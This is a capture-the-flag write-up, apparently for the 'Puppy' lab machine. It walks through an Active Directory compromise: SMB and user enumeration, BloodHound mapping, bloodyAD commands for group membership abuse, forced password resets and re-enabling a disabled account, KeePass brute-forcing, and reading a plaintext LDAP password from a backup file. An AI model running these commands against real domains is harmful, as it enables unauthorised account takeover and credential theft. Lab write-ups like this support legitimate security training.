
![Puppy](https://github.com/user-attachments/assets/78a07797-664c-431c-8872-80041b63ff6c)




# Reconnaissance phase 

			Open 10.10.11.70:53
			Open 10.10.11.70:88
			Open 10.10.11.70:135
			Open 10.10.11.70:139
			Open 10.10.11.70:389
			Open 10.10.11.70:445
			Open 10.10.11.70:464
			Open 10.10.11.70:593
			Open 10.10.11.70:636
			Open 10.10.11.70:2049
			Open 10.10.11.70:111
			Open 10.10.11.70:3269
			Open 10.10.11.70:3268
			Open 10.10.11.70:3260
			Open 10.10.11.70:5985
			Open 10.10.11.70:9389
			Open 10.10.11.70:49664
			Open 10.10.11.70:49667
			Open 10.10.11.70:49670
			Open 10.10.11.70:49669
			Open 10.10.11.70:49685
			Open 10.10.11.70:60683
			Open 10.10.11.70:60711
# Going deeper 
smb using a valid set of credentials

1.crackmapexec smb 10.129.72.114 -u 'levi.james' -p 'KingofAkron2025!' --shares //list available shares with their perms for current user
	
	
# Informations

by enumerating shares , we've came accross interesting stuffs


		[+] Enumerated shares
		SMB         puppy.htb       445    DC               Share           Permissions     Remark
		SMB         puppy.htb       445    DC               -----           -----------     ------
		SMB         puppy.htb       445    DC               ADMIN$                          Remote Admin
		SMB         puppy.htb       445    DC               C$                              Default share
		SMB         puppy.htb       445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
		SMB         puppy.htb       445    DC               IPC$            READ            Remote IPC
		SMB         puppy.htb       445    DC               NETLOGON        READ            Logon server share 
		SMB         puppy.htb       445    DC               SYSVOL          READ            Logon server share 

2.crackmapexec smb 10.129.72.114 -u 'levi.james' -p 'KingofAkron2025!' --users //enum for valid users list using the gained creds

# Note
Once you've found set of possible users , now use nxc to extract users in a file instead of manually copy paste one of them 

	nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt


3.crackmapexec smb 10.129.72.114 -u 'levi.james' -p 'KingofAkron2025!' --rid-brute // list users on the system with their group appartenance and policy

# Next - step

So use now the creds you have to bloodhound server in order to get ldap map

	bloodhound-python -dc dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -c All -o bloodhound_results.json -ns 10.129.72.114
 
![levi](https://github.com/user-attachments/assets/97685b40-9102-4d39-9108-066571655827)


# Note : Now you've got all dump from bloodhound  , read relation between your targetted user and all group in the AD environnement : Remember when we were in smb shares , we saw DEV but can't actually read it , so here is the tip ; we lookup at the PUPPY-DEVS from bloodhound and notice that We able to do operations on the DEV SHARE   

		bloodyAD --host 10.129.158.58 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james


Once done , back to smb share and loggin  so grab recovery.kbdx file 

![Screenshot_2025-05-30_05_18_06](https://github.com/user-attachments/assets/4abfa61e-7780-40c6-9382-6c619bed4e68)


# Then now , how can we breakdown the pass and read keepass file , let's use the awesome script named keepass4brute : here is the link https://github.com/r3nt0n/keepass4brute


		Usage ./keepass4brute.sh <kdbx-file> <wordlist>

  ![Screenshot_2025-05-23_04_07_14](https://github.com/user-attachments/assets/8ce6111e-fb4b-4a28-930b-aa8c8aa6ebd1)


# Got it : here is the creds we need : "ant.edwards : Antman2025!"

If you wanna grab more detail about his actions , use bloodyAD
	
	bloodyAD --host 10.129.158.58 -d puppy.htb -u ant.edwards -p 'Antman2025!' get writable --detail

		here is example of what we've got from it 
					unixUserPassword: WRITE
					badPasswordTime: WRITE
					userPassword: WRITE
As you may see , the user is able to write user's pass , so let's make the tricks append
	here is the article reference for doing that so 

				https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/ 
# Note : For our purpose , i'm going to take it easy by directly using bloodyAD
	
		bloodyAD --host "10.129.158.58" -d puppy.htb -u "ant.edwards" -p 'Antman2025!' set password "adam.silver" "Password@987"

# Note : sometimes like here , you may face to the problem describe as : You got pass changed but you can use it cause account being diable at the time you've change it ; so here is how to bypass it 
	
		# Disable ACCOUNTDISABLE
	bloodyAD -u ant.edwards -d puppy.htb -p 'Antman2025!' --host 10.129.158.58 remove uac adam.silver -f ACCOUNTDISABLE

Now logon as adam.silver and grab the flag the flag 

![Screenshot_2025-05-30_05_40_07](https://github.com/user-attachments/assets/00df0e4a-d6c9-4063-afdc-d9b35706d80d)


# now , let's do the same trick , back to bloodyAD and see what adam.silver user is able to perform

![backups](https://github.com/user-attachments/assets/3965e3ae-1537-4839-b257-3c97c152346e)

![Screenshot_2025-05-30_05_42_02](https://github.com/user-attachments/assets/496070ea-fcba-4ba7-aa9b-0fdbca87de55)



![Screenshot_2025-05-30_05_48_36](https://github.com/user-attachments/assets/03532534-94b0-438e-af8e-a44994fa402c)

grab steph.cooler creds from this file 



				****cat puppy/nms-auth-config.xml.bak
						<?xml version="1.0" encoding="UTF-8"?>
						<ldap-config>
						    <server>
						        <host>DC.PUPPY.HTB</host>
						        <port>389</port>
						        <base-dn>dc=PUPPY,dc=HTB</base-dn>
						        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
						        <bind-password>ChefSteph2025!</bind-password>
						    </server>
						    <user-attributes>
						        <attribute name="username" ldap-attribute="uid" />
						        <attribute name="firstName" ldap-attribute="givenName" />
						        <attribute name="lastName" ldap-attribute="sn" />
						        <attribute name="email" ldap-attribute="mail" />
						    </user-attributes>
						    <group-attributes>
						        <attribute name="groupName" ldap-attribute="cn" />
						        <attribute name="groupMember" ldap-attribute="member" />
						    </group-attributes>
						    <search-filter>
						        <filter>(&(objectClass=person)(uid=%s))</filter>
						    </search-filter>
				
      </ldap-config>





![Screenshot_2025-05-30_05_53_07](https://github.com/user-attachments/assets/6eec496f-4562-4689-8c8a-7dcd00cf7ede)
